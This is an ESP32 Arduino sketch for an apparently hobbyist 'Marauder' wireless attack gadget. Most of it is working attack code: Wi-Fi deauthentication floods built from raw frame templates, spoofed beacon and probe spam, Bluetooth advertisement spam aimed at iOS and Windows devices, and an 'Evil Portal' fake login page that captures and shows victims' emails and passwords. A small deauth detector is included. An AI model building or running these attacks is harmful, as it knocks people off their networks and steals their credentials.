/*
The Ultimate Marauder, TechBot4, but just a test and it works so well. 
Credit
 */

#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <functional>
#include <DNSServer.h>
#include <WebServer.h>

// --- CONFIGURATION ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_MOSI 23
#define OLED_CLK  18
#define OLED_DC   17
#define OLED_CS   5
#define OLED_RST  16

#define JOY_X     36
#define JOY_Y     39
// NOTE: GPIO34-39 are input-only and don't support internal pull-ups.
// Changed to GPIO26 which supports INPUT_PULLUP for reliable button detection.
// If using original GPIO34, an external pull-up resistor (10kΩ to 3.3V) is required.
#define JOY_SW    26

#define MAX_APS 100
#define SERIAL_SPEED 115200

// --- GLOBALS ---
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &SPI, OLED_DC, OLED_RST, OLED_CS);
BLEScan* pBLEScan;

struct APInfo {
  String ssid;
  int rssi;
  uint8_t channel;
  uint8_t bssid[6];
};

APInfo ap_list[MAX_APS];
int ap_count = 0;
int current_menu_index = 0;

// --- MENU DEFINITIONS ---
const char* menu_items[] = {
  "WiFi Scan AP",
  "WiFi Scan Station",
  "WiFi Deauth BCR",
  "WiFi Deauth Target",
  "Beacon Spam List",
  "Beacon Spam Real",
  "Rickroll Beacons",
  "Probe Spam",
  "Evil Portal",
  "BLE Scan",
  "BLE Spam Multi",
  "Raw Sniffing",
  "Capture PMKID",
  "Capture EAPOL",
  "Fox Hunt (Track)",
  "Defense Ward",
  "Matrix Graph",
  "Reboot System"
};
const int menu_count = sizeof(menu_items) / sizeof(menu_items[0]);

// --- PACKET TEMPLATES ---
uint8_t deauth_template[] = { 
  0xc0, 0x00, 0x3a, 0x01, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x07, 0x00 
};

uint8_t beacon_template[] = { 
  0x80, 0x00, 0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 
  0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x64, 0x00, 0x11, 0x00, 0x00, 
  0x00, 0x00 
};

// --- EVIL PORTAL CONTENT ---
// --- EVIL PORTAL CONTENT ---
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Secure Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; background: #eef2f5; margin: 0; padding: 20px; }
.card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.08); max-width: 360px; margin: 40px auto; border-top: 4px solid #007bff; }
.logo { font-size: 48px; color: #007bff; margin-bottom: 20px; }
h2 { color: #333; margin-top: 0; font-size: 24px; font-weight: 600; margin-bottom: 10px; }
p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
input { display: block; width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 15px; outline: none; transition: border 0.2s; }
input:focus { border-color: #007bff; }
button { background: #007bff; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; box-shadow: 0 2px 5px rgba(0,123,255,0.2); }
button:active { background: #0056b3; }
.footer { margin-top: 30px; font-size: 13px; color: #aaa; }
</style></head><body>
<div class="card">
  <div class="logo">&#128274;</div>
  <h2>Network Authentication</h2>
  <p>Standard security check. Please sign in to access the network.</p>
  <form action="/login" method="POST">
    <input type="text" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign In</button>
  </form>
  <div class="footer">Secured by SSL/TLS Encryption</div>
</div>
</body></html>
)rawliteral";

// --- GLOBALS FOR TOOLS ---
unsigned long last_deauth_time = 0; // For Defense Ward
volatile int packet_rate = 0;       // For Matrix Graph

// --- FORWARD DECLARATIONS ---
void wifi_scan_aps();
void wifi_scan_stations();
void wifi_deauth_broadcast();
void wifi_deauth_target(uint8_t* mac);
void wifi_beacon_spam_list();
void wifi_beacon_spam_realistic();
void wifi_rickroll();
void wifi_probe_spam();
void sniffing_start_raw_capture();
void sniffing_capture_pmkid();
void sniffing_capture_eapol();
void evil_portal_run();
void bluetooth_ble_scan();
void bluetooth_ble_spam_multi();
void tool_fox_hunt();
void tool_defense_ward();
void tool_matrix_graph();
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type);

// --- HELPER FUNCTIONS ---
void randomize_mac() {
  uint8_t newMac[6];
  // Generate random MAC
  for(int i=0; i<6; i++) newMac[i] = random(0, 256);
  // Set Locally Administered Bit (0x2) and Unicast (0)
  newMac[0] = (newMac[0] & 0xFC) | 0x02;
  
  esp_wifi_set_mac(WIFI_IF_STA, newMac);
  esp_wifi_set_mac(WIFI_IF_AP, newMac);
}

void ui_wait_for_release() {
  while(digitalRead(JOY_SW) == LOW) { delay(10); } 
}

bool ui_check_button() {
  // Check button with simple debounce
  if (digitalRead(JOY_SW) == LOW) {
    delay(50); // Debounce
    if (digitalRead(JOY_SW) == LOW) {
      while(digitalRead(JOY_SW) == LOW); // Wait for release
      return true;
    }
  }
  return false;
}

// Scrollable List Viewer
// count: Total items
// getLabel: Function to get string for item i
void ui_loop_scrollable_list(int count, std::function<String(int)> getLabel) {
  ui_wait_for_release(); // Prevent immediate exit

  int offset = 0;
  int selected = 0;
  bool running = true;
  unsigned long last_input = 0;

  while (running) {
    // Input Handling
    if (ui_check_button()) running = false;
    
    int yVal = analogRead(JOY_Y);
    if (millis() - last_input > 150) {
      if (yVal < 1000) { // UP
        selected--;
        if (selected < 0) {
          selected = count - 1;
          offset = max(0, count - 5);
        } else if (selected < offset) {
          offset--;
        }
        last_input = millis();
      } else if (yVal > 3000) { // DOWN
        selected++;
        if (selected >= count) {
          selected = 0;
          offset = 0;
        } else if (selected >= offset + 5) {
          offset++;
        }
        last_input = millis();
      }
    }

    // Render
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    
    // Header
    display.setCursor(0, 0);
    display.print(F("Found: "));
    display.print(count);
    display.println(F(" (Press Btn)"));
    display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);

    // List
    for (int i = 0; i < 5; i++) {
        int idx = offset + i;
        if (idx >= count) break;
        
        display.setCursor(0, 14 + i * 10);
        if (idx == selected) {
            display.print(F("> "));
        } else {
            display.print(F("  "));
        }
        String label = getLabel(idx);
        if (label.length() > 18) label = label.substring(0, 18);
        display.println(label);
    }
    display.display();
  }
}

// Continuous Task Loop
// title: Screen Title
// task: Function to call repeatedly
void ui_loop_continuous_task(String title, std::function<void()> task) {
    ui_wait_for_release(); // Prevent immediate exit

    bool running = true;
    
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.println(title);
    display.println(F("---------------------"));
    display.println(F("RUNNING..."));
    display.println(F("Press Button to STOP"));
    display.display();

    while(running) {
        if (ui_check_button()) {
            running = false;
            break;
        }
        task();
        yield(); // Let ESP32 handle background tasks
    }

    display.setCursor(0, 50);
    display.println(F("STOPPED."));
    display.display();
    delay(1000);
}

// --- WIFI TOOLS ---
void wifi_send_packet(uint8_t* buf, int len, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
}

void wifi_scan_aps() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println(F("Scanning APs..."));
  display.display();

  ap_count = WiFi.scanNetworks(false, true, false, 100);
  
  if (ap_count == 0) {
      display.println(F("No APs found."));
      display.display();
      delay(1000);
      return;
  }

  // Populate global list with deduplication
  std::vector<String> seen_ssids;
  int unique_count = 0;

  for (int i = 0; i < ap_count && unique_count < MAX_APS; i++) {
    String s = WiFi.SSID(i);
    bool duplicate = false;
    for (String seen : seen_ssids) {
        if (seen == s) { duplicate = true; break; }
    }
    
    if (!duplicate) {
        seen_ssids.push_back(s);
        
        ap_list[unique_count].ssid = s;
        ap_list[unique_count].rssi = WiFi.RSSI(i);
        ap_list[unique_count].channel = WiFi.channel(i);
        memcpy(ap_list[unique_count].bssid, WiFi.BSSID(i), 6);
        unique_count++;
    }
  }
  
  // Update global count to reflect unique APs
  ap_count = unique_count;

  // Interactive View
  ui_loop_scrollable_list(ap_count, [](int i) -> String {
      return ap_list[i].ssid + " (" + String(ap_list[i].rssi) + ")";
  });
}

void wifi_scan_stations() {
    // Live Station Monitor
    esp_wifi_set_promiscuous(true);
    
    ui_loop_continuous_task("STATION SCAN", []() {
        // Just keep screen alive, callback prints to Serial
        // Ideally we would capture stations in a list here, 
        // but for now we trust the logs as per previous design.
        // We can add a packet counter visual later.
    });
    
    esp_wifi_set_promiscuous(false);
}

void wifi_deauth_broadcast() {
  if (ap_count == 0) {
      Serial.println(F("Scan APs first!"));
      return;
  }
  
  Serial.println(F("Starting Deauth Broadcast Loop..."));
  
  ui_loop_continuous_task("DEAUTH ALL", []() {
      for (int i = 0; i < ap_count; i++) {
        memcpy(deauth_template + 10, ap_list[i].bssid, 6);
        memcpy(deauth_template + 16, ap_list[i].bssid, 6);
        
        // Send burst
        for (int k = 0; k < 64; k++) {
            wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[i].channel);
            delay(1);
        }
      }
      delay(10); 
  });
}

void wifi_deauth_target(uint8_t* mac) {
  if (ap_count == 0) return;

  Serial.println(F("Starting Target Deauth Loop..."));
  
  ui_loop_continuous_task("DEAUTH TARGET", [mac]() {
     memcpy(deauth_template + 4, mac, 6);
     memcpy(deauth_template + 10, ap_list[0].bssid, 6);
     memcpy(deauth_template + 16, ap_list[0].bssid, 6);
     
     // Send burst
     for (int k = 0; k < 64; k++) {
         wifi_send_packet(deauth_template, sizeof(deauth_template), ap_list[0].channel);
         delay(1);
     }
     delay(10);
  });
}

void wifi_beacon_spam_custom(const char* ssid) {
  uint8_t packet[128];
  int ssid_len = strlen(ssid);
  if(ssid_len > 32) ssid_len = 32;
  
  memcpy(packet, beacon_template, sizeof(beacon_template));
  packet[37] = ssid_len;
  memcpy(packet + 38, ssid, ssid_len);
  
  // Random BSSID/Src
  for (int i = 10; i < 16; i++) packet[i] = random(0, 256);
  memcpy(packet + 16, packet + 10, 6);
  
  wifi_send_packet(packet, 38 + ssid_len, random(1, 14));
}

void wifi_beacon_spam_list() {
  const char* ssids[] = {"Free WiFi", "Starbucks", "xfinity", "Marauder_Ghst"};
  ui_loop_continuous_task("BEACON LIST", [ssids]() {
      for (int i = 0; i < 4; i++) {
        wifi_beacon_spam_custom(ssids[i]);
        delay(5);
      }
  });
}

void wifi_beacon_spam_realistic() {
  const char* ssids[] = {
    "Living Room TV", "HP-Print-55", "iPhone 13", "Uber Connect", 
    "Starbucks WiFi", "Xfinity Mobile", "Guest WiFi", "Office_Printer", 
    "Cafe_Free", "NETGEAR-99", "Linksys-2.4", "AndroidAP", 
    "FBI Surveillance", "Virus_Free", "GetOffMyLawn", "Setup-7728",
    "DIRECTV_WVB", "Google Home", "Samsung TV", "SkyNet"
  };
  
  ui_loop_continuous_task("REAL BEACONS", [ssids]() {
      // Broadcast 5 random from list per loop to simulate activity
      for (int i = 0; i < 5; i++) {
        const char* name = ssids[random(0, 20)];
        wifi_beacon_spam_custom(name);
        delay(10);
      }
      
      // Update stats
      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Networks: "));
      display.print(20);
      display.display();
  });
}

void wifi_rickroll() {
  const char* lyrics[] = {"Never Gonna", "Give You Up", "Never Gonna", "Let You Down"};
  ui_loop_continuous_task("RICKROLL", [lyrics]() {
      for (int i = 0; i < 4; i++) {
        wifi_beacon_spam_custom(lyrics[i]);
        delay(5);
      }
  });
}

void wifi_probe_spam() {
  // Simple random probe request frame
  static uint8_t probe_pkt[] = {
    0x40, 0x00, 0x00, 0x00, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: Random
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID: Broadcast
    0x00, 0x00, // Seq
    0x00, 0x00 // Tag length 0 (SSID wildcard)
  };
  
  ui_loop_continuous_task("PROBE SPAM", []() {
      // Randomize Source
      for (int i = 10; i < 16; i++) probe_pkt[i] = random(0, 256);
      wifi_send_packet(probe_pkt, sizeof(probe_pkt), random(1, 14));
      delay(5);
  });
}

// --- BLUETOOTH TOOLS ---
void bluetooth_ble_scan() {
  Serial.println(F("Starting BLE Scan..."));
    
  if (pBLEScan == nullptr) {
    display.clearDisplay();
    display.setCursor(0,0);
    display.println(F("BLE Init Failed!"));
    display.display();
    delay(2000);
    return;
  }
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println(F("Scanning BLE..."));
  display.display();

  BLEScanResults* foundDevices = pBLEScan->start(5, false);
  int count = foundDevices->getCount();

  // Interactive View
  ui_loop_scrollable_list(count, [foundDevices](int i) -> String {
      BLEAdvertisedDevice d = foundDevices->getDevice(i);
      if (d.haveName()) return String(d.getName().c_str());
      return String(d.getAddress().toString().c_str());
  });

  pBLEScan->clearResults(); 
}

void bluetooth_ble_spam_multi() {
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  
  // Payloads
  // iOS (Sour Apple) - 0x004C
  // Windows (Swift Pair) - 0x0006
  
  ui_loop_continuous_task("BLE SPAM (MIX)", [pAdvertising]() {
      // 1. iOS Spam
      BLEAdvertisementData iosData;
      iosData.setFlags(0x06);
      iosData.setManufacturerData("\x4c\x00\x02\x15\x58\x5c\xde\x93\x1b\x01\x42\xcc\x9a\x13\x25\x00\x9b\xed\xc6\x5e\x00\x00\x00\x00\xc5");
      pAdvertising->setAdvertisementData(iosData);
      pAdvertising->start();
      
      display.fillRect(0, 30, SCREEN_WIDTH, 20, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Target: iOS"));
      display.display();
      
      delay(200);
      pAdvertising->stop();
      delay(50);
      
      // 2. Windows Spam
      BLEAdvertisementData winData;
      winData.setFlags(0x06);
      winData.setManufacturerData("\x06\x00\x03\x00\x80"); 
      pAdvertising->setAdvertisementData(winData);
      pAdvertising->start();
      
      display.fillRect(0, 30, SCREEN_WIDTH, 20, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Target: Windows"));
      display.display();
      
      delay(200);
      pAdvertising->stop();
      delay(50);
  });
}

// --- EVIL PORTAL ---
// Use a fixed array for simplicity without <vector> overhead if desired, 
// using std::vector needs #include <vector> which standard in Arduino logic.
#include <vector> 
std::vector<String> captured_creds;

void evil_portal_run() {
  // Randomize MAC for privacy (Must turn off WiFi first)
  WiFi.mode(WIFI_OFF);
  delay(100);
  randomize_mac();

  const byte DNS_PORT = 53;
  IPAddress apIP(192, 168, 1, 1);
  DNSServer dnsServer;
  WebServer server(80);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Free WiFi"); 

  // Redirect all
  dnsServer.start(DNS_PORT, "*", apIP);

  // Setup Web Server
  server.on("/", HTTP_GET, [&server]() {
      server.send_P(200, "text/html", index_html);
  });
  
  server.on("/generate_204", HTTP_GET, [&server]() { 
      server.send_P(200, "text/html", index_html);
  });

  server.on("/login", HTTP_POST, [&server]() {
      String email = server.arg("email");
      String pass = server.arg("password");
      Serial.println("CREDENTIALS CAPTURED:");
      Serial.println(email + ":" + pass);
      
      // Store creds
      String entry = email + ":" + pass;
      if (captured_creds.size() >= 10) captured_creds.erase(captured_creds.begin()); // Keep last 10
      captured_creds.push_back(entry);
      
      server.send(200, "text/html", "<h1>Verify Success. Connecting...</h1><script>setTimeout(function(){window.location.href='http://google.com';}, 2000);</script>");
  });
  
  server.onNotFound([&server]() {
      server.send_P(200, "text/html", index_html);
  });
  
  server.begin();

  ui_wait_for_release();

  bool running = true;
  captured_creds.clear(); 
  int view_index = 0;
  unsigned long last_nav = 0;

  while(running) {
    // 1. Input
    if (ui_check_button()) running = false;
    
    // Joystick Nav
    int yVal = analogRead(JOY_Y);
    if (millis() - last_nav > 200 && !captured_creds.empty()) {
        if (yVal < 1000) { // UP (Previous)
            if (view_index > 0) view_index--;
            last_nav = millis();
        } else if (yVal > 3000) { // DOWN (Next)
            if (view_index < captured_creds.size() - 1) view_index++;
            last_nav = millis();
        }
    }
    
    // Auto-follow newest if we were at the end
    if (captured_creds.size() > 0 && view_index >= captured_creds.size()) {
        view_index = captured_creds.size() - 1;
    }

    dnsServer.processNextRequest();
    server.handleClient();
    
    // 2. UI Render (Detail View)
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    
    if (captured_creds.empty()) {
        display.setCursor(0, 20);
        display.println(F("Status: LISTENING"));
        display.println(F("----------------"));
        display.println(F("Connect to:"));
        display.println(F("Free WiFi"));
        display.setCursor(0, 55);
        display.println(F("Waiting for victim.."));
    } else {
        // Parse current item
        String s = captured_creds[view_index];
        int sep = s.indexOf(':');
        String e = (sep != -1) ? s.substring(0, sep) : s;
        String p = (sep != -1) ? s.substring(sep+1) : "";

        // Header
        display.setCursor(0, 0);
        display.print(F("Log "));     
        display.print(view_index + 1);
        display.print(F("/"));
        display.print(captured_creds.size());
        display.print(F(" (Use Joy)"));
        display.drawLine(0, 9, SCREEN_WIDTH, 9, SSD1306_WHITE);
        
        // Body (Wrapped)
        display.setCursor(0, 12);
        display.println(F("Email:"));
        display.println(e); // println wraps automatically
        
        // Dynamic spacing based on email length approx
        int passY = display.getCursorY() + 2; 
        display.setCursor(0, passY);
        display.println(F("Pass:"));
        display.println(p);
    }
    
    display.display();
    delay(50); 
  }
  
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

// --- SNIFFER ---
static int pkts_captured = 0; // For visual feedback

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  pkts_captured++;
  packet_rate++;
  
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;

  // Check for EAPOL
  if (len > 34 && payload[32] == 0x88 && payload[33] == 0x8e) {
    Serial.print(F("EAPOL detected!"));
  }
  
  // Deauth Detection (for Defense Ward)
  if (type == WIFI_PKT_MGMT) {
    uint8_t fc0 = payload[0];
    if ((fc0 & 0xFC) == 0xC0 || (fc0 & 0xFC) == 0xA0) {
        last_deauth_time = millis();
    }
  }
}

void sniffing_start_raw_capture() {
  pkts_captured = 0;
  esp_wifi_set_promiscuous(true);
  
  ui_loop_continuous_task("RAW SNIFFING", []() {
      // Update stats on specific interval or just rely on global var?
      // Since ui_loop clears screen once, we need to manually update it or custom loop.
      // reusing ui_loop_continuous_task is hard for dynamic text updates without param.
      // Let's just overload the behavior by hacking the "task" to draw too? 
      // No, ui_loop_continuous does not clear screen inside loop.
      // So we can draw here.
      
      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Pkts: "));
      display.println(pkts_captured);
      display.display();
      delay(100);
  });
  
  esp_wifi_set_promiscuous(false);
}

void sniffing_capture_pmkid() {
  pkts_captured = 0;
  esp_wifi_set_promiscuous(true);
  ui_loop_continuous_task("PMKID SNIFF", []() {
      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Pkts: "));
      display.println(pkts_captured);
      display.display();
      delay(100);
  });
  esp_wifi_set_promiscuous(false);
}

void sniffing_capture_eapol() {
  pkts_captured = 0;
  esp_wifi_set_promiscuous(true);
  ui_loop_continuous_task("EAPOL SNIFF", []() {
      display.fillRect(0, 30, SCREEN_WIDTH, 10, SSD1306_BLACK);
      display.setCursor(0, 30);
      display.print(F("Pkts: "));
      display.println(pkts_captured);
      display.display();
      delay(100);
  });
  esp_wifi_set_promiscuous(false);
}

// --- UI FUNCTIONS ---
// Note: Yellow/Blue OLED has Y=0-15 YELLOW, Y=16-63 BLUE
void ui_draw_menu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header in Yellow Zone (Y 0-15, centered at Y=4)
  display.setCursor(10, 4);
  display.println(F("MARAUDER MENU"));
  display.drawLine(0, 15, SCREEN_WIDTH, 15, SSD1306_WHITE);
  
  // Menu items in Blue Zone (starting Y=17)
  for (int i = 0; i < 5; i++) {
    int idx = (current_menu_index + i) % menu_count;
    int y = 17 + i * 9;
    display.setCursor(0, y);
    if (i == 0) {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
    } else {
      display.setTextColor(SSD1306_WHITE);
    }
    display.print(F(" "));
    display.println(menu_items[idx]);
  }
  display.setTextColor(SSD1306_WHITE);
  display.display();
}

void ui_select_item() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  // Header
  display.setCursor(20, 0);
  display.println(F("RUNNING..."));
  display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
  
  // Selected item
  display.setCursor(0, 26);
  display.println(menu_items[current_menu_index]);
  display.display();
  
  switch (current_menu_index) {
    case 0: wifi_scan_aps(); break;
    case 1: wifi_scan_stations(); break;
    case 2: wifi_deauth_broadcast(); break;
    case 3: 
        if(ap_count > 0) wifi_deauth_target(ap_list[0].bssid); 
        else Serial.println(F("No APs to target"));
        break;
    case 4: wifi_beacon_spam_list(); break;
    case 5: wifi_beacon_spam_realistic(); break;
    case 6: wifi_rickroll(); break;
    case 7: wifi_probe_spam(); break;
    case 8: evil_portal_run(); break;
    case 9: bluetooth_ble_scan(); break;
    case 10: bluetooth_ble_spam_multi(); break;
    case 11: sniffing_start_raw_capture(); break;
    case 12: sniffing_capture_pmkid(); break;
    case 13: sniffing_capture_eapol(); break;
    case 14: tool_fox_hunt(); break;
    case 15: tool_defense_ward(); break;
    case 16: tool_matrix_graph(); break;
    case 17: ESP.restart(); break;
  }
  
  delay(1500); // Pause to let user see "Run: ..."
  ui_draw_menu();
}

// 1. FOX HUNT (Signal Strength Tracker)
void tool_fox_hunt() {
  if (ap_count == 0) {
      display.clearDisplay(); 
      display.setCursor(0,0);
      display.println(F("Scan APs first!"));
      display.display();
      delay(1500);
      return;
  }

  // Simple Selection
  int selected = 0;
  bool selecting = true;
  ui_wait_for_release();
  
  while(selecting) {
      if (ui_check_button()) selecting = false;
      
      int yVal = analogRead(JOY_Y);
      if (yVal < 1000) { selected--; delay(150); }
      if (yVal > 3000) { selected++; delay(150); }
      if (selected < 0) selected = ap_count - 1;
      if (selected >= ap_count) selected = 0;
      
      display.clearDisplay();
      display.setCursor(0,0);
      display.println(F("Select Target:"));
      display.println(F("----------------"));
      display.print(F("> "));
      display.println(ap_list[selected].ssid.substring(0, 14));
      display.print(F("  "));
      display.println(ap_list[(selected+1)%ap_count].ssid.substring(0, 14));
      display.setCursor(0, 50);
      display.println(F("Btn: TRACK THIS"));
      display.display();
  }
  
  ui_wait_for_release();
  
  int target_channels[] = { ap_list[selected].channel }; 
  String target_ssid = ap_list[selected].ssid;
  
  bool running = true;
  while(running) {
      if (ui_check_button()) running = false;
      
      int n = WiFi.scanNetworks(false, true, false, 50, target_channels[0]);
      int rssi = -100;
      for(int i=0; i<n; i++) {
          if (WiFi.SSID(i) == target_ssid) {
              rssi = WiFi.RSSI(i);
              break;
          }
      }
      
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(0,0);
      display.print(F("TRACKING: "));
      display.println(target_ssid.substring(0,10));
      
      int barWidth = map(constrain(rssi, -100, -40), -100, -40, 2, SCREEN_WIDTH);
      
      display.fillRect(0, 20, barWidth, 20, SSD1306_WHITE);
      display.drawRect(0, 20, SCREEN_WIDTH, 20, SSD1306_WHITE);
      
      display.setTextSize(2);
      display.setCursor(0, 45);
      display.print(rssi);
      display.print(F(" dBm"));
      
      display.display();
      delay(10);
  }
}

// 2. DEFENSE WARD (Deauth Detector)
void tool_defense_ward() {
  ui_wait_for_release();
  esp_wifi_set_promiscuous(true);
  
  bool running = true;
  last_deauth_time = 0;
  
  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0,0);
  display.println(F("DEFENSE WARD ACTIVE"));
  display.println(F("----------------"));
  display.println(F("Monitoring for"));
  display.println(F("attacks..."));
  display.display();

  while(running) {
      if (ui_check_button()) running = false;
      
      if (millis() - last_deauth_time < 1000) {
          display.invertDisplay(true);
          display.clearDisplay();
          display.setTextSize(2);
          display.setCursor(10, 20);
          display.println(F("ATTACK!"));
          display.setTextSize(1);
          display.setCursor(20, 45);
          display.println(F("Deauth Detected"));
          display.display();
      } else {
          display.invertDisplay(false);
          display.clearDisplay();
          display.setTextSize(1);
          display.setCursor(0,0);
          display.println(F("STATUS: SECURE"));
          display.drawLine(0, 10, SCREEN_WIDTH, 10, SSD1306_WHITE);
          
          display.setCursor(0, 25);
          display.println(F("No attacks detected"));
          display.println(F("in range."));
          display.display();
      }
      delay(50);
  }
  
  esp_wifi_set_promiscuous(false);
  display.invertDisplay(false);
}

// 3. MATRIX (Traffic Graph)
void tool_matrix_graph() {
  ui_wait_for_release();
  esp_wifi_set_promiscuous(true);
  
  int history[128];
  memset(history, 0, sizeof(history));
  bool running = true;
  
  while(running) {
      if (ui_check_button()) running = false;
      
      int current_traffic = packet_rate; 
      packet_rate = 0; 
      
      for(int i=0; i<127; i++) history[i] = history[i+1];
      history[127] = constrain(current_traffic, 0, 50); 
      
      display.clearDisplay();
      
      for(int i=0; i<127; i++) {
          int y1 = 64 - history[i];
          int y2 = 64 - history[i+1];
          display.drawLine(i, y1, i+1, y2, SSD1306_WHITE);
      }
      
      display.fillRect(0, 0, 128, 10, SSD1306_BLACK);
      display.setCursor(0,0);
      display.print(F("MATRIX: "));
      display.print(current_traffic * 10); 
      display.print(F(" pkts/s"));
      
      display.display();
      delay(100);
  }
  esp_wifi_set_promiscuous(false);
}

// --- MAIN SETUP & LOOP ---
void setup() {
  Serial.begin(SERIAL_SPEED);
  
  // Joystick Button Input - Use INPUT_PULLUP for reliable detection
  // Button reads LOW when pressed, HIGH when released
  pinMode(JOY_SW, INPUT_PULLUP);
  
  // OLED Init
  if(!display.begin(SSD1306_SWITCHCAPVCC)) { 
    Serial.println(F("OLED Init Failed")); 
    for(;;); 
  }
  
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 20);
  display.println(F("MARAUDER"));
  display.setTextSize(1);
  display.setCursor(10, 45);
  display.println(F("ULTIMATE"));
  display.display();
  delay(2000);

  // WiFi Init
  WiFi.mode(WIFI_OFF);
  delay(10);
  // Randomize MAC on Boot
  randomize_mac();
  
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  
  // BLE Init
  BLEDevice::init("Marauder");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  
  ui_draw_menu();
  Serial.println(F("System Ready."));
}

void loop() {
  // Joystick Simulation / Serial Control
  if (Serial.available()) {
    char c = Serial.read();
    if (c == 'n') { // NEXT
      current_menu_index = (current_menu_index + 1) % menu_count;
      ui_draw_menu();
    }
    if (c == 'p') { // PREVIOUS
      current_menu_index--;
      if(current_menu_index < 0) current_menu_index = menu_count - 1;
      ui_draw_menu();
    }
    if (c == 's') { // SELECT
      ui_select_item();
    }
  }
  
  // Real Joystick Logic (If connected)
  int yVal = analogRead(JOY_Y);
  int swVal = digitalRead(JOY_SW);
  static unsigned long last_input = 0;
  static unsigned long last_btn = 0;
  
  if (millis() - last_input > 200) {
    if (yVal < 1000) { // UP
       current_menu_index--;
       if(current_menu_index < 0) current_menu_index = menu_count - 1;
       ui_draw_menu();
       last_input = millis();
    }
    else if (yVal > 3000) { // DOWN
       current_menu_index = (current_menu_index + 1) % menu_count;
       ui_draw_menu();
       last_input = millis();
    }
  }
  
  // Joystick button press (active LOW)
  if (swVal == LOW && millis() - last_btn > 300) {
    ui_select_item();
    last_btn = millis();
  }
}
